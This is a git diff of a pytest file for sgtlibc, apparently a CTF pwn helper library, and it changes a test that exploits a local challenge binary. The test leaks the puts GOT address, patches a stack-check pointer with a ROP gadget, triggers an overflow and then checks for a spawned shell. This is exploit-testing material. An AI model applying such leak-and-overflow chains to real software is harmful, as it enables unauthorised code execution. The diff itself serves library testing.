@@ -3,9 +3,10 @@ import sgtlibc.gamebox as gb
 
 import sgtlibc.ROPgadgets
 import os
-from .common import get_elf_resources
+from .common import get_elf_resources, check_shell_validate
 import pytest
 import platform
+
 
 @pytest.mark.skipif(platform.uname()[0] == 'Windows', reason='skip windows')
 @pytest.mark.skipif(platform.uname()[0] == 'Darwin', reason='skip mac')
@@ -66,7 +67,7 @@ def test_pwn1():
     for db_index, libc_version in enumerate(s.db):
         try:
             gb.set_config(config)
-            edit_addr_value(stk_chk, gb.p64(pops['ret'])) # invalid stk_chk
+            edit_addr_value(stk_chk, gb.p64(pops['ret']))  # invalid stk_chk
 
             puts_got = leak('puts')
             gb.log.info(f'puts_got:{hex(puts_got)}')
@@ -85,9 +86,7 @@ def test_pwn1():
             edit_buf_value(len(payload), payload)
             program_exit()  # 触发溢出
             gb.rl()
-            gb.sl(b'echo success me')
-            data = gb.rc()
-            assert data == b'success me\n'
+            check_shell_validate()
             gb.close()
             break
         except Exception as e:
